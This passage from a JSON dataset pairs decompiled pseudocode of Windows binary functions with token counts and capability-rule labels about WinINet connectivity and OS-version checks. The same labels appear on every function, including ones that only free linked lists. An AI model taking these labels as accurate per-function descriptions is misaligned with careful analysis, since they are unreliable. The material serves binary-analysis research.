        "decompiled_code": "\nuint __cdecl fcn.0006bb20(uint *arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    var_ch = fcn.000774f0(*arg_8h);\n    while( true ) {\n        do {\n            var_8h = (**(var_ch + 8))(*var_4h, &var_14h, &var_10h, 100, 0);\n            if ((var_8h != 0) && (var_4h[3] != 0)) {\n                var_8h = 0x21590006;\n            }\n        } while (var_8h == 0x21590002);\n        if (var_8h != 0) break;\n        var_8h = fcn.00077800(var_4h[1], var_4h[2], var_14h, var_10h, 0);\n        (**(var_ch + 4))(*var_4h, var_14h, 0);\n        if (var_8h != 0) {\ncode_r0x0006bbdc:\n            var_4h[3] = 1;\n            return 0;\n        }\n    }\n    if (var_4h[3] == 0) {\n        fcn.00077a60(var_4h[1], var_4h[2]);\n    }\n    goto code_r0x0006bbdc;\n}\n",
        "token_count": 357
    },
    "0006bbf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006bbf0(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    int32_t var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_134h;\n    uint var_130h;\n    \n    fcn.00078790(&var_150h, 0, 0x150);\n    var_134h = *arg_ch;\n    var_130h = arg_ch[1];\n    var_168h = 0;\n    var_164h = 0;\n    var_160h = 0;\n    var_15ch = 0;\n    var_154h = 0;\n    var_158h = &var_150h;\n    var_15ch = fcn.0006a060(arg_8h, arg_ch[2]);\n    if (var_15ch == 0) {\n        iVar1 = 0x21590003;\n    }\n    else {\n        do {\n            iVar1 = fcn.0006b170(&var_168h);\n        } while (iVar1 == 0);\n        fcn.0006a0d0(arg_8h, arg_ch[2], 1);\n    }\n    return iVar1;\n}\n",
        "token_count": 318
    },
    "0006bcc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006bcc0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x168);\n    if (arg_8h_00 == 0) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, 0x168);\n        *(arg_8h_00 + 4) = 0xb1c36390;\n        *(arg_8h_00 + 8) = 0xb1c36320;\n        *(arg_8h_00 + 0xc) = 0xb1c36d60;\n        *(arg_8h_00 + 0x10) = 0xb1c36e50;\n        iVar2 = fcn.00077090(arg_8h_00, 0xb1c46360);\n        if (iVar2 == 0) {\n            fcn.00035330(arg_8h_00);\n            uVar1 = 0x21590004;\n        }\n        else {\n            fcn.000344f0(arg_8h_00 + 0x44);\n            fcn.00036a10(arg_8h_00 + 0x1c);\n            *(arg_8h_00 + 0x15c) = 1;\n            *(arg_8h_00 + 0x160) = *(*(arg_8h + 4) + 0xc);\n            fcn.00076610(*(*(arg_8h + 4) + 0xc), *(arg_8h + 200));\n            *(*(arg_8h + 4) + 0xc) = 0;\n            *(arg_8h + 200) = 0;\n            *arg_ch = 0;\n            arg_ch[1] = 0;\n            *arg_ch = arg_8h_00;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 490
    },
    "0006bf20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0006bf20(void)\n\n{\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    if (*0xb1c6776c != 0) {\n        fcn.000340b0(0xb1c5a7e0);\n        fcn.00037270(0xb1c5a7d8, &var_ch);\n        fcn.00037220(0xb1c5a7d8);\n        fcn.00034080(0xb1c5a7e0);\n        fcn.00036ab0(0xb1c5a7e4);\n        var_4h = *0xb1c5a7f4;\n        while (var_4h != NULL) {\n            fcn.00075d60(var_4h + 2, 0);\n            fcn.00034550(var_4h + 3);\n            fcn.000345c0(var_4h + 3);\n            fcn.00034520(var_4h + 3);\n            var_8h = *var_4h;\n            fcn.00035330(var_4h);\n            var_4h = var_8h;\n        }\n        *0xb1c5a7f4 = NULL;\n        fcn.00036b60(0xb1c5a7e4);\n        fcn.00036a80(0xb1c5a7e4);\n        *0xb1c6776c = 0;\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "0006c000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006c000(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_ch_00;\n    uint32_t uVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    char var_dh;\n    int32_t var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    var_18h = 0;\ncode_r0x0006c014:\n    do {\n        if (arg_ch <= var_18h) {\n            return 0;\n        }\n        iVar1 = fcn.000786fa(arg_8h + var_18h, 0xd, (arg_ch - var_18h) + -1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*(iVar1 + 1) != '\\n') {\n            return 0;\n        }\n        var_4h = iVar1 - (arg_8h + var_18h);\n        if (var_4h == 0) {\n            return 0;\n        }\n        var_ch = fcn.000786fa(arg_8h + var_18h, 0x3a, var_4h + -1);\n        if (var_ch == 0) {\n            return 0;\n        }\n        if (*(var_ch + 1) != ' ') {\n            return 0;\n        }\n        var_ch = var_ch + 2;\n        var_4h = iVar1 - var_ch;\n        if (((var_4h < 0x1a) || (iVar2 = fcn.00037750(var_ch, 0x16, &var_20h),  iVar2 == 0)) || (var_20h != *0xb1c4645c)\n           ) {\n            if (((var_4h < 0xe) || (iVar2 = fcn.000378b0(var_ch),  iVar2 == 0)) || (*0xb1c461ec == 0)) {\n                var_18h = (iVar1 - arg_8h) + 2;\n                goto code_r0x0006c014;\n            }\n            var_ch = var_ch + 10;\n            var_4h = var_4h - 10;\n        }\n        else {\n            var_ch = var_ch + 0x16;\n            var_4h = var_4h - 0x16;\n        }\n        arg_ch_00 = fcn.00035230(var_4h);\n        if (arg_ch_00 == NULL) {\n            return 0;\n        }\n        uVar3 = fcn.000342e0(var_ch, arg_ch_00, var_4h);\n        if ((uVar3 != 0xffffffff) && (3 < uVar3)) {\n            *arg_10h = *arg_ch_00;\n            arg_10h[1] = arg_ch_00[1];\n            fcn.00046f40(arg_10h);\n            var_8h = arg_10h;\n            var_dh = '\\0';\n            for (var_14h = 0; var_14h < 7; var_14h = var_14h + 1) {\n                var_dh = var_dh + *var_8h;\n                var_8h = var_8h + 1;\n            }\n            if (*(arg_10h + 7) == var_dh) {\n                *arg_14h = arg_ch_00;\n                *arg_18h = uVar3;\n                return 1;\n            }\n        }\n        fcn.00035330(arg_ch_00);\n        var_18h = (iVar1 - arg_8h) + 2;\n    } while( true );\n}\n",
        "token_count": 907
    },
    "0006c210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0006c210(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint32_t var_14h;\n    uint8_t var_dh;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_24h = 0;\n    var_18h = NULL;\n    if ((arg_10h == 0) && (arg_18h != 0)) {\n        arg_ch = 0;\n    }\n    if ((*(arg_8h + 6) & 1) == 0) {\n        var_ch = *arg_8h;\n    }\n    else {\n        var_28h = fcn.0006c590(&fcn.0006c210::var_ch, arg_14h, *(arg_8h + 6), arg_ch, arg_10h);\n        if (var_28h != 0) goto code_r0x0006c545;\n    }\n    fcn.00036ab0(0xb1c5a7e4);\n    var_1ch = NULL;\n    for (var_18h = *0xb1c5a7f4; (var_18h != NULL && (var_18h[1] != var_ch)); var_18h = *var_18h) {\n        var_1ch = var_18h;\n    }\n    if (var_18h == NULL) {\n        fcn.00036b60(0xb1c5a7e4);\n        var_28h = 6;\n    }\n    else if ((*(arg_8h + 6) & 8) == 0) {\n        fcn.00034550(var_18h + 3);\n        fcn.00036b60(0xb1c5a7e4);\n        uVar1 = fcn.0006be20();\n        var_18h[6] = uVar1;\n        if ((*(arg_8h + 6) & 2) == 0) {\n            if (arg_ch == 0) {\n                var_28h = fcn.00048170(arg_1ch, arg_18h, &fcn.0006c210::var_8h, &fcn.0006c210::arg_10h);\n                if (var_28h != 0) goto code_r0x0006c545;\n                arg_ch = var_8h;\n            }\n            else {\n                var_8h = 0;\n            }\n            var_28h = fcn.00076330(0x6c3d2, arg_ch, arg_10h, 0);\n            fcn.00035330(var_8h);\n            if (var_28h != 0) goto code_r0x0006c545;\n        }\n        var_30h = 0;\n        var_2ch = 0;\n        if ((*(arg_8h + 6) & 4) == 0) {\n            var_24h = 0;\n            var_20h = 0;\n            var_2ch._2_2_ = 2;\n        }\n        else {\n            iVar2 = fcn.0006be20();\n            var_28h = fcn.000763f0(var_18h[2], &fcn.0006c210::var_24h, &fcn.0006c210::var_20h, var_18h[4], 0);\n            iVar3 = fcn.0006be20();\n            if (var_28h == 0x21590002) {\n                var_24h = 0;\n                var_20h = 0;\n                var_2ch._0_3_ = CONCAT12(2, var_2ch);\n                var_2ch = var_2ch & 0xff000000 | var_2ch;\n                uVar4 = fcn.000785f8();\n                var_18h[4] = uVar4 % var_18h[5] + var_18h[4];\n            }\n            else {\n                if (var_28h != 0) goto code_r0x0006c545;\n                var_18h[4] = var_18h[4] + (iVar3 - iVar2) >> 1;\n            }\n            if (*0xb1c46154 < var_18h[4]) {\n                var_18h[4] = *0xb1c460b4;\n            }\n        }\n        if ((*(arg_8h + 6) & 1) != 0) {\n            var_2ch._2_2_ = var_2ch._2_1_ | 1;\n        }\n        var_30h = var_ch;\n        var_2ch = CONCAT22(var_2ch._2_2_, *(arg_8h + 1));\n        var_4h = &fcn.0006c210::var_30h;\n        var_dh = 0;\n        for (var_14h = 0; var_14h < 7; var_14h = var_14h + 1) {\n            var_dh = var_dh + *var_4h;\n            var_4h = var_4h + 1;\n        }\n        var_2ch = var_2ch & 0xffffff | var_dh << 0x18;\n        var_28h = fcn.00048260(arg_1ch, &fcn.0006c210::var_30h, var_24h, var_20h);\n        uVar1 = fcn.0006be20();\n        var_18h[6] = uVar1;\n    }\n    else {\n        if (var_1ch == NULL) {\n            *0xb1c5a7f4 = *var_18h;\n        }\n        else {\n            *var_1ch = *var_18h;\n        }\n        fcn.00036b60(0xb1c5a7e4);\n        fcn.00034550(var_18h + 3);\n        fcn.00075d60(var_18h + 2, 0);\n        fcn.000345c0(var_18h + 3);\n        fcn.00034520(var_18h + 3);\n        fcn.00035330(var_18h);\n        var_18h = NULL;\n        var_28h = 0x4ca;\n    }\ncode_r0x0006c545:\n    if (var_18h != NULL) {\n        fcn.00076610(var_18h[2], var_24h);\n        fcn.000345c0(var_18h + 3);\n    }\n    if (var_28h != 0) {\n        fcn.000484a0(arg_1ch, var_28h);\n    }\n    return var_28h;\n}\n",
        "token_count": 1685
    },
    "0006c590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006c590(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h, uint *arg_14h, char *arg_18h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uchar uVar3;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    uint uVar6;\n    char *pcVar7;\n    uint var_1f8h;\n    uint var_1f0h;\n    uint *var_1ech;\n    uint var_1e8h;\n    uint var_1e0h;\n    uint *var_1dch;\n    uint var_1d8h;\n    uint var_1d0h;\n    uint *var_1cch;\n    uint var_1c8h;\n    uint var_1c0h;\n    uint *var_1bch;\n    uint var_1b8h;\n    uint var_1b0h;\n    uint *var_1ach;\n    uint *var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint *var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint *var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar4 = (arg_10h & 0x30) >> 4;\n    arg_8h_00 = fcn.00035200(0x1c);\n    if (arg_8h_00 == NULL) {\n        iVar5 = 0x21590004;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        fcn.000344f0(arg_8h_00 + 3);\n        arg_8h_00[4] = *0xb1c460b4;\n        arg_8h_00[5] = *0xb1c4619c;\n        do {\n            uVar3 = fcn.000785f8();\n            *arg_8h = uVar3;\n            uVar3 = fcn.000785f8();\n            *(arg_8h + 1) = uVar3;\n            uVar3 = fcn.000785f8();\n            *(arg_8h + 2) = uVar3;\n            uVar3 = fcn.000785f8();\n            *(arg_8h + 3) = uVar3;\n            fcn.00036ab0(0xb1c5a7e4);\n            for (var_10ch = *0xb1c5a7f4; (var_10ch != NULL && (var_10ch[1] != *arg_8h)); var_10ch = *var_10ch) {\n            }\n            fcn.00036b60(0xb1c5a7e4);\n        } while (var_10ch != NULL);\n        arg_8h_00[1] = *arg_8h;\n        if (arg_18h == NULL) {\n            var_8h = 0xb1be2394;\n        }\n        else {\n            var_8h = arg_14h;\n            var_1ach = arg_14h;\n            pcVar7 = arg_14h + 1;\n            do {\n                cVar1 = *var_1ach;\n                var_1ach = var_1ach + 1;\n            } while (cVar1 != '\\0');\n            if (arg_18h < var_1ach + (1 - pcVar7)) {\n                fcn.00035330(arg_8h_00);\n                return 0x21590065;\n            }\n            arg_14h = arg_14h + var_1ach + (1 - pcVar7);\n            arg_18h = arg_18h + -(var_1ach + (1 - pcVar7));\n        }\n        var_4h = 0;\n        if (arg_18h == NULL) {\n            fcn.0002bdc0(&var_190h, 0x80);\n            if (uVar4 != 0) {\n                puVar2 = &var_190h;\n                do {\n                    var_1cch = puVar2;\n                    puVar2 = var_1cch + 1;\n                } while (*var_1cch != '\\0');\n                fcn.0007865e(var_1cch, 0xb1be15f0, uVar4);\n            }\n            var_19ch = &var_190h;\n        }\n        else {\n            var_19ch = arg_14h;\n            var_1bch = arg_14h;\n            do {\n                cVar1 = *var_1bch;\n                var_1bch = var_1bch + 1;\n            } while (cVar1 != '\\0');\n            pcVar7 = var_1bch - (arg_14h + 1);\n            if (arg_18h < pcVar7) {\n                fcn.00035330(arg_8h_00);\n                return 0x21590066;\n            }\n            arg_14h = arg_14h + pcVar7 + 1;\n            arg_18h = arg_18h + -(pcVar7 + 1);\n        }\n        var_1dch = var_19ch;\n        do {\n            cVar1 = *var_1dch;\n            var_1dch = var_1dch + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = fcn.00075a40(arg_8h_00 + 2, &var_8h, 0, 0, var_19ch, var_1dch + (1 - (var_19ch + 1)), 2);\n        if (iVar5 == 0) {\n            if (arg_18h == NULL) {\n                iVar5 = fcn.000785ce(arg_ch, 0x3d);\n                if (iVar5 != 0) {\n                    fcn.00075d60(arg_8h_00 + 2, 0);\n                    fcn.00035330(arg_8h_00);\n                    return 0x21590064;\n                }\n                fcn.00020a20(&var_108h, 0x100, 0xb1be28bc, arg_ch);\n                var_1a8h = &var_108h;\n            }\n            else {\n                var_1a8h = arg_14h;\n                var_1ech = arg_14h;\n                do {\n                    cVar1 = *var_1ech;\n                    var_1ech = var_1ech + 1;\n                } while (cVar1 != '\\0');\n                if (arg_18h < var_1ech - (arg_14h + 1)) {\n                    fcn.00035330(arg_8h_00);\n                    return 0x21590067;\n                }\n            }\n            iVar5 = fcn.00076270(arg_8h_00[2], var_1a8h, 0);\n            if (iVar5 == 0) {\n                iVar5 = fcn.000760f0(arg_8h_00[2], 0);\n                if (iVar5 == 0) {\n                    uVar6 = fcn.0006be20();\n                    arg_8h_00[6] = uVar6;\n                    fcn.00036c40(0xb1c5a7e4);\n                    *arg_8h_00 = *0xb1c5a7f4;\n                    *0xb1c5a7f4 = arg_8h_00;\n                    fcn.00036cd0(0xb1c5a7e4);\n                    iVar5 = 0;\n                }\n                else {\n                    fcn.00075d60(arg_8h_00 + 2, 0);\n                    fcn.00035330(arg_8h_00);\n                }\n            }\n            else {\n                fcn.00075d60(arg_8h_00 + 2, 0);\n                fcn.00035330(arg_8h_00);\n            }\n        }\n        else {\n            fcn.00035330(arg_8h_00);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1961
    },
    "0006cb80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0006cb80(void)\n\n{\n    int32_t iVar1;\n    uint *var_8h;\n    uint *var_4h;\n    \ncode_r0x0006cb86:\n    iVar1 = fcn.000340e0(0xb1c5a7e0, 60000);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    do {\n        fcn.00036c40(0xb1c5a7e4);\n        var_8h = NULL;\n        for (var_4h = *0xb1c5a7f4; var_4h != NULL; var_4h = *var_4h) {\n            iVar1 = fcn.0006be20();\n            if (900000 < iVar1 - var_4h[6]) {\n                if (var_8h == NULL) {\n                    *0xb1c5a7f4 = *var_4h;\n                }\n                else {\n                    *var_8h = *var_4h;\n                }\n                break;\n            }\n            var_8h = var_4h;\n        }\n        fcn.00036cd0(0xb1c5a7e4);\n        if (var_4h == NULL) goto code_r0x0006cb86;\n        fcn.00034550(var_4h + 3);\n        fcn.00075d60(var_4h + 2, 0);\n        fcn.000345c0(var_4h + 3);\n        fcn.00034520(var_4h + 3);\n        fcn.00035330(var_4h);\n    } while( true );\n}\n",
        "token_count": 375
    },
    "0006cc80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0006cc80(void)\n\n{\n    uint *puVar1;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00034550(0xb1c5a8f8);\n    for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n        var_ch = *(var_8h * 4 + -0x4e3a5808);\n        while (var_ch != NULL) {\n            puVar1 = *var_ch;\n            fcn.00035330(var_ch);\n            var_ch = puVar1;\n        }\n        *(var_8h * 4 + -0x4e3a5808) = 0;\n    }\n    fcn.000345c0(0xb1c5a8f8);\n    fcn.00034520(0xb1c5a8f8);\n    return;\n}\n",
        "token_count": 223
    },
    "0006cd00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0006cd00(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = ((arg_8h >> 5) + arg_ch) % 0x40;\n    puVar1 = fcn.00035200(0xc);\n    if (puVar1 != NULL) {\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n        puVar1[1] = arg_8h;\n        puVar1[2] = arg_ch;\n        fcn.00034550(0xb1c5a8f8);\n        *puVar1 = *(uVar2 * 4 + -0x4e3a5808);\n        *(uVar2 * 4 + -0x4e3a5808) = puVar1;\n        fcn.000345c0(0xb1c5a8f8);\n    }\n    return puVar1 != NULL;\n}\n",
        "token_count": 256
    },
    "0006cd90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006cd90(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_ch = 0;\n    uVar1 = ((arg_8h >> 5) + arg_ch) % 0x40;\n    fcn.00034550(0xb1c5a8f8);\n    var_4h = NULL;\n    var_10h = *(uVar1 * 4 + -0x4e3a5808);\n    do {\n        if (var_10h == NULL) {\ncode_r0x0006ce34:\n            fcn.000345c0(0xb1c5a8f8);\n            return var_ch;\n        }\n        if ((var_10h[1] == arg_8h) && (var_10h[2] == arg_ch)) {\n            if (var_4h == NULL) {\n                *(uVar1 * 4 + -0x4e3a5808) = *var_10h;\n            }\n            else {\n                *var_4h = *var_10h;\n            }\n            fcn.00035330(var_10h);\n            var_ch = 1;\n            goto code_r0x0006ce34;\n        }\n        var_4h = var_10h;\n        var_10h = *var_10h;\n    } while( true );\n}\n",
        "token_count": 342
    },
    "0006ce50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006ce50(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00034550(0xb1c5a8f8);\n    var_ch = *((((arg_8h >> 5) + arg_ch) % 0x40) * 4 + -0x4e3a5808);\n    do {\n        if (var_ch == NULL) {\ncode_r0x0006ceba:\n            fcn.000345c0(0xb1c5a8f8);\n            return var_8h;\n        }\n        if ((var_ch[1] == arg_8h) && (var_ch[2] == arg_ch)) {\n            var_8h = 1;\n            goto code_r0x0006ceba;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 224
    },
    "0006ced0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006ced0(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = fcn.00035200(0x14);\n    if (var_4h == NULL) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = 0;\n        var_4h[2] = 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n        var_ch = arg_ch;\n        var_8h = 0;\n        iVar1 = fcn.00073870(var_4h + 1, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h & 3 | 0x10000);\n        if (iVar1 == 0) {\n            fcn.000344f0(var_4h + 2);\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.00035330(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 331
    },
    "0006cfd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006cfd0(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_8h = fcn.00073c40(*(arg_8h + 4), &var_ch, 0);\n    if (var_8h == 0) {\n        var_4h = fcn.00035200(0x14);\n        if (var_4h == NULL) {\n            fcn.00073b30(&var_ch, 0);\n            var_8h = 0x21590004;\n        }\n        else {\n            *var_4h = 0;\n            var_4h[1] = 0;\n            var_4h[2] = 0;\n            var_4h[3] = 0;\n            var_4h[4] = 0;\n            var_4h[1] = var_ch;\n            var_4h[4] = *(arg_8h + 0x10);\n            fcn.000344f0(var_4h + 2);\n            *arg_ch = var_4h;\n            var_8h = 0;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 290
    },
    "0006d150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006d150(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 0x10) == 0) {\n            *arg_10h = 0;\n            var_4h = 4;\n            var_8h = fcn.000741a0(*(arg_8h + 4), arg_10h, &var_4h, arg_14h, 1);\n            if (var_8h == 0) {\n                iVar1 = fcn.00035490(*arg_10h);\n                *arg_10h = iVar1;\n                if (*arg_10h < 0) {\n                    fcn.00073b30(arg_8h + 4, 0);\n                    *(arg_8h + 0xc) = 1;\n                    var_8h = 0x2159000a;\n                }\n                else {\n                    iVar1 = fcn.00035200(*arg_10h);\n                    *arg_ch = iVar1;\n                    if (*arg_ch == 0) {\n                        fcn.00073b30(arg_8h + 4, 0);\n                        *(arg_8h + 0xc) = 1;\n                        var_8h = 0x21590004;\n                    }\n                    else if (*arg_10h != 0) {\n                        if ((arg_18h & 1) == 0) {\n                            var_8h = fcn.000741a0(*(arg_8h + 4), *arg_ch, arg_10h, 60000, 1);\n                        }\n                        else {\n                            var_8h = fcn.000741a0(*(arg_8h + 4), *arg_ch, arg_10h, arg_14h, 1);\n                        }\n                        if (var_8h != 0) {\n                            fcn.00035330(*arg_ch);\n                            *arg_ch = 0;\n                            *(arg_8h + 0xc) = 1;\n                            fcn.00073b30(arg_8h + 4, 0);\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *arg_10h = 0x800;\n            iVar1 = fcn.00035200(*arg_10h);\n            *arg_ch = iVar1;\n            if (*arg_ch == 0) {\n                *arg_10h = 0;\n                var_8h = 0x21590004;\n            }\n            else {\n                var_8h = fcn.000741a0(*(arg_8h + 4), *arg_ch, arg_10h, arg_14h, 0);\n                if (var_8h != 0) {\n                    fcn.00035330(*arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                }\n            }\n        }\n    }\n    else {\n        var_8h = 0x21590065;\n    }\n    return var_8h;\n}\n",
        "token_count": 736
    },
    "0006d420": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
